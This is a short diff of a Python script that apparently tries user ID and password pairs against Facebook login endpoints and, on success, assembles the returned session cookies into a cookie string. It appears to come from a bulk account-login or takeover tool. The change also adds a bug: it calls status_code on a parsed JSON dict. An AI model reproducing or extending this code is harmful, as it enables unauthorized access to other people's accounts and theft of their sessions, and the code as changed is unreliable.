@@ -1493,8 +1493,7 @@ def p(uid,pwx,tl):
             'Content-Type': 'application/x-www-form-urlencoded',
             'Content-Length': '1026'}
             url = "https://www.facebook.com/v13.0/dialog/oauth?"
-            result = requests.post(url, data=data, headers=headers)
-            print(f"Response Code: {result.status_code}")
+            result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
@@ -1584,6 +1583,7 @@ def x(uid,pwx,tl):
             'Content-Length': '847'}
             url = "https://graph.facebook.com/auth/login"
             result = requests.post(url, data=data, headers=headers).json()
+            print(f"Response Code: {result.status_code}")
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
